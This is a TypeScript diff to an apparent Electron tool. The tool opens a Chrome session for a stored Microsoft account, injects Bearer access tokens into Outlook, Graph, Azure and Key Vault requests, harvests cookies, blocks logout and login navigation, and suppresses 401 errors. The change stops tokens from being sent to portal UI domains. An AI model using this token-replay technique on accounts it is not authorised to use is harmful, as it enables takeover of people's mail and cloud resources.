@@ -57,10 +57,13 @@ function decodeJwt(token: string): Record<string, unknown> | null {
 const MS_DOMAINS = ['microsoft.com', 'microsoftonline.com', 'office.com', 'office365.com', 'azure.com', 'sharepoint.com', 'live.com', 'onedrive.com', 'onenote.com'];
 function isMsDomain(hostname: string): boolean { return MS_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d)); }
 
-const API_DOMAINS = ['outlook.office365.com', 'outlook.office.com', 'outlook.cloud.microsoft.com', 'outlook.cloud.microsoft', 'substrate.office.com', 'graph.microsoft.com', 'admin.microsoft.com', 'portal.office.com', 'www.office.com', 'portal.azure.com', 'management.azure.com', 'entra.microsoft.com', 'graph.windows.net', 'api.azrbac.mspim.azure.com', 'main.iam.ad.ext.azure.com'];
+const API_DOMAINS = ['outlook.office365.com', 'outlook.office.com', 'outlook.cloud.microsoft.com', 'outlook.cloud.microsoft', 'substrate.office.com', 'graph.microsoft.com', 'portal.office.com', 'www.office.com', 'management.azure.com', 'graph.windows.net', 'api.azrbac.mspim.azure.com', 'main.iam.ad.ext.azure.com'];
+// UI portal domains — do NOT inject Bearer tokens; these authenticate via OAuth flow + cookies
+const PORTAL_UI_DOMAINS = ['portal.azure.com', 'entra.microsoft.com', 'admin.microsoft.com'];
+function isPortalUiDomain(hostname: string): boolean { return PORTAL_UI_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d)); }
 function isApiDomain(hostname: string): boolean { return API_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d)); }
 
-const CDN_DOMAINS = ['res.office365.com', 'res.cdn.office.net', 'cdn.office.net', 'akamaized.net', 'msecnd.net', 'aspnetcdn.com', 'office.net', 'shellprod.msocdn.com'];
+const CDN_DOMAINS = ['res.office365.com', 'res.cdn.office.net', 'cdn.office.net', 'akamaized.net', 'msecnd.net', 'aspnetcdn.com', 'office.net', 'shellprod.msocdn.com', 'hosting.portal.azure.net', 'portal.azure.net', 'reactblade.portal.azure.net'];
 function isCdnDomain(hostname: string): boolean { return CDN_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d)); }
 
 const LOGOUT_PATHS = ['/logout', '/signout', '/logoff', '/sign-out', 'oauth2/logout', '/common/oauth2/v2.0/logout'];
@@ -250,13 +253,13 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
         return resourceTokens.graph || (firstResult!.access_token as string);
       if (hostname.includes('substrate'))
         return resourceTokens.substrate || (firstResult!.access_token as string);
-      if (hostname.includes('management.azure') || hostname.includes('portal.azure'))
+      if (hostname.includes('management.azure'))
         return resourceTokens.azure || resourceTokens.graph || (firstResult!.access_token as string);
       if (hostname.includes('vault.azure'))
         return resourceTokens.keyvault || resourceTokens.azure || (firstResult!.access_token as string);
       if (hostname.includes('storage.azure') || hostname.includes('blob.core.windows') || hostname.includes('file.core.windows') || hostname.includes('table.core.windows') || hostname.includes('queue.core.windows'))
         return resourceTokens.storage || resourceTokens.azure || (firstResult!.access_token as string);
-      if (hostname.includes('entra.microsoft') || hostname.includes('iam.ad.ext.azure') || hostname.includes('azrbac.mspim.azure'))
+      if (hostname.includes('iam.ad.ext.azure') || hostname.includes('azrbac.mspim.azure'))
         return resourceTokens.graph || (firstResult!.access_token as string);
       return resourceTokens.graph || (firstResult!.access_token as string);
     }
@@ -487,7 +490,8 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
       // Everything else — pass through (also harvest cookies from MS domains)
       try {
         const resp = await net.fetch(request);
-        if ((isOwaOrOffice || isSharepoint || parsed.hostname.includes('microsoft') || parsed.hostname.includes('live.com')) && resp.headers.getSetCookie) {
+        const isPortalOrMs = isPortalUiDomain(parsed.hostname) || parsed.hostname.includes('microsoft') || parsed.hostname.includes('live.com') || parsed.hostname.includes('azure.com');
+        if ((isOwaOrOffice || isSharepoint || isPortalOrMs) && resp.headers.getSetCookie) {
           for (const setCookieStr of resp.headers.getSetCookie()) {
             try {
               const eqI = setCookieStr.indexOf('=');
@@ -1015,17 +1019,18 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
               return;
             }
 
-            // OWA/Office/Graph/Azure requests — continue with Authorization header (use freshest token)
-            if (reqUrl.includes('outlook.office365.com') || reqUrl.includes('outlook.office.com') || reqUrl.includes('outlook.cloud.microsoft') || reqUrl.includes('substrate.office.com') || reqUrl.includes('graph.microsoft.com') || reqUrl.includes('management.azure.com') || reqUrl.includes('portal.azure.com') || reqUrl.includes('vault.azure.net') || reqUrl.includes('entra.microsoft.com') || reqUrl.includes('graph.windows.net') || reqUrl.includes('azrbac.mspim.azure.com') || reqUrl.includes('iam.ad.ext.azure.com')) {
+            // OWA/Office/Graph/Azure API requests — continue with Authorization header (use freshest token)
+            // NOTE: portal.azure.com, entra.microsoft.com, admin.microsoft.com are UI domains — do NOT inject Bearer
+            if (reqUrl.includes('outlook.office365.com') || reqUrl.includes('outlook.office.com') || reqUrl.includes('outlook.cloud.microsoft') || reqUrl.includes('substrate.office.com') || reqUrl.includes('graph.microsoft.com') || reqUrl.includes('management.azure.com') || reqUrl.includes('vault.azure.net') || reqUrl.includes('graph.windows.net') || reqUrl.includes('azrbac.mspim.azure.com') || reqUrl.includes('iam.ad.ext.azure.com')) {
               const existingHeaders = params.request.headers || {};
               const headerList = Object.entries(existingHeaders).map(([n, v]) => ({ name: n, value: v as string }));
               // Pick the right token for the domain
               let bearerToken = owaToken;
               if (reqUrl.includes('graph.microsoft.com')) bearerToken = resourceTokens.graph || graphToken;
               else if (reqUrl.includes('substrate')) bearerToken = resourceTokens.substrate || owaToken;
-              else if (reqUrl.includes('management.azure.com') || reqUrl.includes('portal.azure.com')) bearerToken = resourceTokens.azure || resourceTokens.graph || owaToken;
+              else if (reqUrl.includes('management.azure.com')) bearerToken = resourceTokens.azure || resourceTokens.graph || owaToken;
               else if (reqUrl.includes('vault.azure.net')) bearerToken = resourceTokens.keyvault || resourceTokens.azure || owaToken;
-              else if (reqUrl.includes('entra.microsoft') || reqUrl.includes('graph.windows.net') || reqUrl.includes('azrbac') || reqUrl.includes('iam.ad.ext')) bearerToken = resourceTokens.graph || owaToken;
+              else if (reqUrl.includes('graph.windows.net') || reqUrl.includes('azrbac') || reqUrl.includes('iam.ad.ext')) bearerToken = resourceTokens.graph || owaToken;
               else bearerToken = resourceTokens.outlook || owaToken;
               if (!headerList.some(h => h.name.toLowerCase() === 'authorization')) {
                 headerList.push({ name: 'Authorization', value: 'Bearer ' + bearerToken });
@@ -1082,10 +1087,8 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
             { urlPattern: 'https://outlook.cloud.microsoft/*', requestStage: 'Request' },
             { urlPattern: '*substrate.office.com/*', requestStage: 'Request' },
             { urlPattern: '*graph.microsoft.com/*', requestStage: 'Request' },
-            // Azure/Entra domains
+            // Azure API domains (NOT portal.azure.com / entra.microsoft.com — those are UI domains)
             { urlPattern: 'https://management.azure.com/*', requestStage: 'Request' },
-            { urlPattern: 'https://portal.azure.com/*', requestStage: 'Request' },
-            { urlPattern: 'https://entra.microsoft.com/*', requestStage: 'Request' },
             { urlPattern: 'https://graph.windows.net/*', requestStage: 'Request' },
             { urlPattern: '*vault.azure.net/*', requestStage: 'Request' },
             { urlPattern: '*azrbac.mspim.azure.com/*', requestStage: 'Request' },
@@ -1125,9 +1128,11 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
   var AZURE_TOKEN = ${JSON.stringify(resourceTokens.azure || owaToken)};
   var KV_TOKEN = ${JSON.stringify(resourceTokens.keyvault || resourceTokens.azure || owaToken)};
   var STORAGE_TOKEN = ${JSON.stringify(resourceTokens.storage || resourceTokens.azure || owaToken)};
-  var MS_DOMAINS = ['outlook.office365.com','outlook.office.com','outlook.cloud.microsoft.com','outlook.cloud.microsoft','substrate.office.com','graph.microsoft.com','outlook.live.com','management.azure.com','portal.azure.com','entra.microsoft.com','vault.azure.net','graph.windows.net','azrbac.mspim.azure.com','iam.ad.ext.azure.com'];
+  var MS_DOMAINS = ['outlook.office365.com','outlook.office.com','outlook.cloud.microsoft.com','outlook.cloud.microsoft','substrate.office.com','graph.microsoft.com','outlook.live.com','management.azure.com','vault.azure.net','graph.windows.net','azrbac.mspim.azure.com','iam.ad.ext.azure.com'];
+  var PORTAL_UI = ['portal.azure.com','entra.microsoft.com','admin.microsoft.com'];
+  function isPortalUi(url){try{var h=new URL(url).hostname;return PORTAL_UI.some(function(d){return h===d||h.endsWith('.'+d)})}catch(e){return false}}
   function isMsDomain(url){try{var h=new URL(url).hostname;return MS_DOMAINS.some(function(d){return h.includes(d)})}catch(e){return false}}
-  function getToken(url){if(url.includes('graph.microsoft.com'))return GRAPH_TOKEN;if(url.includes('management.azure.com')||url.includes('portal.azure.com'))return AZURE_TOKEN;if(url.includes('vault.azure.net'))return KV_TOKEN;if(url.includes('storage.azure')||url.includes('.core.windows.net'))return STORAGE_TOKEN;if(url.includes('entra.microsoft')||url.includes('graph.windows.net')||url.includes('azrbac')||url.includes('iam.ad.ext'))return GRAPH_TOKEN;if(url.includes('outlook.cloud.microsoft'))return TOKEN;return TOKEN}
+  function getToken(url){if(isPortalUi(url))return null;if(url.includes('graph.microsoft.com'))return GRAPH_TOKEN;if(url.includes('management.azure.com'))return AZURE_TOKEN;if(url.includes('vault.azure.net'))return KV_TOKEN;if(url.includes('storage.azure')||url.includes('.core.windows.net'))return STORAGE_TOKEN;if(url.includes('graph.windows.net')||url.includes('azrbac')||url.includes('iam.ad.ext'))return GRAPH_TOKEN;if(url.includes('outlook.cloud.microsoft'))return TOKEN;return TOKEN}
   function isBlockedNav(url){return typeof url==='string'&&(url.includes('login.microsoftonline.com')||url.includes('/logoff')||url.includes('/signout')||url.includes('/logout')||url.includes('oauth2/authorize')||url.includes('outlook.cloud.microsoft'))}
 
   // 1. Override fetch — add Bearer token + suppress 401s
@@ -1135,17 +1140,16 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
   var origFetch = window.fetch;
   window.fetch = function(input, init){
     var url = typeof input === 'string' ? input : (input && input.url ? input.url : '');
-    if(isMsDomain(url)){
+    var token = getToken(url);
+    if(isMsDomain(url) && token){
       if(typeof input === 'string'){
-        // String URL — safe to modify init
         init = init || {};
         var h = new Headers(init.headers || {});
-        if(!h.has('Authorization')) h.set('Authorization','Bearer '+getToken(url));
+        if(!h.has('Authorization')) h.set('Authorization','Bearer '+token);
         init = Object.assign({}, init, {headers: h});
       } else if(input && typeof input === 'object' && input instanceof Request){
-        // Request object — clone it and add our header without losing original headers
         var existingHeaders = new Headers(input.headers);
-        if(!existingHeaders.has('Authorization')) existingHeaders.set('Authorization','Bearer '+getToken(url));
+        if(!existingHeaders.has('Authorization')) existingHeaders.set('Authorization','Bearer '+token);
         input = new Request(input, {headers: existingHeaders});
       }
     }
@@ -1172,8 +1176,9 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
     return origOpen.apply(this, arguments);
   };
   XMLHttpRequest.prototype.send = function(){
-    if(this._portalUrl && isMsDomain(this._portalUrl)){
-      try{this.setRequestHeader('Authorization','Bearer '+getToken(this._portalUrl))}catch(e){}
+    var xhrToken = this._portalUrl ? getToken(this._portalUrl) : null;
+    if(this._portalUrl && isMsDomain(this._portalUrl) && xhrToken){
+      try{this.setRequestHeader('Authorization','Bearer '+xhrToken)}catch(e){}
     }
     return origSend.apply(this, arguments);
   };
